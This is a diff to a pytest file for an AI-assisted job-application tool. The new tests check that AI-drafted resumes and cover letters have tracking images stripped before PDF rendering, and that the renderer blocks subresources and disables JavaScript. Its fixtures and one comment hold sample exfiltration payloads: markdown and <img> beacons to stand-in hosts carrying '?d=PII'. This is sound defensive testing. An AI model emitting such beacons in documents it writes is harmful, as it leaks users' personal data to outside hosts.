@@ -5,11 +5,17 @@ sandbox flags. Covers the F1-F4 fixes from the prompt security sweep."""
 from __future__ import annotations
 
 import re
+import sys
 from types import SimpleNamespace
 
+import pytest
+from sqlalchemy.pool import StaticPool
+from sqlmodel import Session, SQLModel, create_engine
+
 from job_applier import drafts, pdf
-from job_applier.ai import bans, drafting, prompt_safety, scoring, suggest
+from job_applier.ai import bans, drafting, prompt_safety, providers, scoring, suggest
 from job_applier.config import settings
+from job_applier.models.db import FilterStatus, JobPosting, Resume
 
 
 def _job(
@@ -161,9 +167,254 @@ def test_save_markdown_sanitizes_all_writers(tmp_path, monkeypatch):
     assert "tracker.example" in saved  # ... but the URL text is preserved, readable
 
 
+# ---- the strip that runs BEFORE the PDF render (F1a, in-memory half) -------
+#
+# `save_markdown` (above) protects the copy on *disk*. The load-bearing half is
+# `drafting.generate_draft` stripping the same vectors in memory, because the HTML
+# it hands the renderer is built from those in-memory strings — that is what the
+# browser engine actually loads, and what would fetch `![](https://attacker/?d=PII)`.
+# These tests pin that the HTML reaching `_render_html_to_pdf` is clean, for BOTH
+# documents (the resume and the cover letter are separate writers).
+
+_SCORE_JSON = (
+    '{"score": 70, "rubric": {"skills_overlap": {"points": 20, "note": "x"}, '
+    '"experience_match": {"points": 20, "note": "y"}, "role_fit": {"points": 15, "note": "z"}, '
+    '"domain_fit": {"points": 8, "note": "d"}, "hard_requirements": {"points": 7, "note": "h"}}, '
+    '"reasoning": "ok"}'
+)
+
+# A provider response whose BOTH documents carry exfil vectors: a markdown image
+# (the auto-fetched beacon) and a raw <img> tag. Distinct hosts per document so a
+# test can tell which writer it is looking at.
+_EXFIL_ENVELOPE = (
+    '{"resume_md": "# Jane Dev\\n\\n![beacon](https://resume-beacon.example/p?d=PII)\\n\\n'
+    'Senior engineer.\\n\\n<img src=\\"https://resume-beacon.example/raw.gif\\">\\n", '
+    '"cover_letter_md": "# Jane Dev\\n\\nDear Acme team,\\n\\n'
+    '![beacon](https://letter-beacon.example/p?d=PII)\\n\\nI build services.\\n\\n'
+    '<img src=\\"https://letter-beacon.example/raw.gif\\">\\n\\nSincerely,\\nJane\\n"}'
+)
+
+
+def _draft_engine():
+    e = create_engine(
+        "sqlite://", connect_args={"check_same_thread": False}, poolclass=StaticPool
+    )
+    SQLModel.metadata.create_all(e)
+    return e
+
+
+def _seed_for_draft(session):
+    session.add(
+        Resume(
+            original_filename="r.pdf",
+            pdf_path="/tmp/r.pdf",
+            extracted_text="TypeScript, Node.js.",
+            is_active=True,
+        )
+    )
+    job = JobPosting(
+        source="test",
+        source_id="t-1",
+        url="https://e.com/1",
+        title="Senior Engineer",
+        company_name="Acme",
+        description="We use TypeScript.",
+        dedupe_hash="h-1",
+        filter_status=FilterStatus.passed,
+    )
+    session.add(job)
+    session.commit()
+    session.refresh(job)
+    return job
+
+
+def _route_provider(draft_json: str):
+    """Score prompts get a valid rubric, draft prompts the (evil) envelope."""
+
+    def _run(provider, prompt, **kwargs):
+        return _SCORE_JSON if "skills_overlap" in prompt else draft_json
+
+    return _run
+
+
+def _rendered_body(html: str) -> str:
+    """The document body of a print-HTML page.
+
+    The head's inlined `<style>` block is our own first-party CSS (no subresource,
+    nothing fetched), but `find_exfil_vectors` is a markdown-level detector and
+    counts any `<style>` tag as a hit — so the assertion is scoped to the body,
+    which is the part built from provider text.
+    """
+    start = html.index("<body>") + len("<body>")
+    return html[start : html.index("</body>")]
+
+
+@pytest.fixture
+def captured_draft_html(tmp_path, monkeypatch):
+    """Run `generate_draft` against a provider that returns exfil-laden markdown and
+    hand back the HTML that reached the PDF renderer, keyed by draft kind."""
+    monkeypatch.setattr(settings, "applications_dir", tmp_path)
+    monkeypatch.setattr(providers, "run", _route_provider(_EXFIL_ENVELOPE))
+
+    seen: list[str] = []
+
+    def _capture(html: str) -> bytes:
+        seen.append(html)
+        return b"%PDF-1.7 fake"
+
+    monkeypatch.setattr(drafting, "_render_html_to_pdf", _capture)
+
+    with Session(_draft_engine()) as s:
+        job = _seed_for_draft(s)
+        drafting.generate_draft(s, "claude", job)
+
+    # generate_draft renders resume first, then cover letter.
+    assert len(seen) == 2, "both drafts must be rendered"
+    return dict(zip(("resume", "cover_letter"), seen))
+
+
+@pytest.mark.parametrize(
+    "kind,beacon_host",
+    [
+        ("resume", "resume-beacon.example"),
+        ("cover_letter", "letter-beacon.example"),
+    ],
+)
+def test_rendered_html_carries_no_exfil_vector(captured_draft_html, kind, beacon_host):
+    """The PDF engine is what would fetch a tracking URL, so the HTML it is given must
+    be clean — for the cover letter as much as the resume."""
+    html = captured_draft_html[kind]
+    assert bans.find_exfil_vectors(_rendered_body(html)) == []
+    # The beacon host is gone entirely: neither as a fetched `src` nor as inert text
+    # a human reader could be tricked into visiting.
+    assert beacon_host not in html
+    # ... and the legitimate prose survived the strip.
+    assert "Jane Dev" in html
+
+
+def test_rendered_html_is_the_sanitized_text_not_the_raw_envelope(captured_draft_html):
+    """Belt-and-braces on the same line: no `<img>` reaches the renderer at all."""
+    for kind, html in captured_draft_html.items():
+        assert "<img" not in _rendered_body(html).lower(), f"{kind} kept an image tag"
+
+
 # ---- PDF network-block policy (F1b) ---------------------------------------
 
 
 def test_pdf_permit_request_navigation_only():
     assert pdf._permit_request(True) is True  # top-document navigation allowed
     assert pdf._permit_request(False) is False  # every subresource blocked
+
+
+# The predicate above is inert unless it is actually wired into the browser engine.
+# These tests pin the wiring: a `**/*` route handler is registered, that handler
+# continues the navigation and aborts every subresource, and JS is off. Deleting the
+# `context.route(...)` line reopens the exfiltration channel with no other symptom.
+
+
+class _FakeRoute:
+    """Minimal Playwright `Route` double: records which disposition was called."""
+
+    def __init__(self, *, navigation: bool):
+        self.request = SimpleNamespace(is_navigation_request=lambda: navigation)
+        self.disposition: str | None = None
+
+    def continue_(self):
+        self.disposition = "continue"
+
+    def abort(self):
+        self.disposition = "abort"
+
+
+class _FakePage:
+    def __init__(self, recorder):
+        self._rec = recorder
+
+    def goto(self, url, wait_until=None):
+        self._rec["goto"] = (url, wait_until)
+
+    def pdf(self, **kwargs):
+        self._rec["pdf_kwargs"] = kwargs
+        return b"%PDF-1.7 fake"
+
+
+class _FakeContext:
+    def __init__(self, recorder):
+        self._rec = recorder
+
+    def route(self, pattern, handler):
+        self._rec["routes"].append((pattern, handler))
+
+    def new_page(self):
+        return _FakePage(self._rec)
+
+
+class _FakeBrowser:
+    def __init__(self, recorder):
+        self._rec = recorder
+
+    def new_context(self, **kwargs):
+        self._rec["context_kwargs"] = kwargs
+        return _FakeContext(self._rec)
+
+    def close(self):
+        self._rec["closed"] = True
+
+
+class _FakePlaywright:
+    """Stands in for the `sync_playwright()` context manager. No browser is launched."""
+
+    def __init__(self, recorder):
+        self._rec = recorder
+        self.chromium = SimpleNamespace(launch=lambda: _FakeBrowser(recorder))
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, *exc):
+        return False
+
+
+@pytest.fixture
+def playwright_recorder(monkeypatch):
+    """Stub `playwright.sync_api.sync_playwright` and return what `_render_via_playwright`
+    did with it. Never launches a real Chromium (see the `browser`-marked test for that)."""
+    rec: dict = {"routes": []}
+    monkeypatch.setitem(
+        sys.modules,
+        "playwright.sync_api",
+        SimpleNamespace(sync_playwright=lambda: _FakePlaywright(rec)),
+    )
+    rec["pdf_bytes"] = pdf._render_via_playwright("file:///tmp/draft.html")
+    return rec
+
+
+def test_pdf_render_registers_the_subresource_guard(playwright_recorder):
+    patterns = [p for p, _h in playwright_recorder["routes"]]
+    assert patterns == ["**/*"], "every request must go through the guard"
+    assert playwright_recorder["pdf_bytes"] == b"%PDF-1.7 fake"
+
+
+def test_pdf_render_disables_javascript(playwright_recorder):
+    # The print HTML needs no JS, so a draft that smuggled a <script> past the
+    # sanitizer still cannot run during the render.
+    assert playwright_recorder["context_kwargs"].get("java_script_enabled") is False
+
+
+@pytest.mark.parametrize(
+    "navigation,expected",
+    [
+        (True, "continue"),  # the top document itself loads
+        (False, "abort"),  # image / font / script / fetch: blocked
+    ],
+)
+def test_registered_guard_blocks_every_subresource(
+    playwright_recorder, navigation, expected
+):
+    """The handler that was actually registered — not a re-implementation of it."""
+    routes = playwright_recorder["routes"]
+    assert routes, "no request guard registered: every subresource would load"
+    _pattern, guard = routes[0]
+    route = _FakeRoute(navigation=navigation)
+    guard(route)
+    assert route.disposition == expected
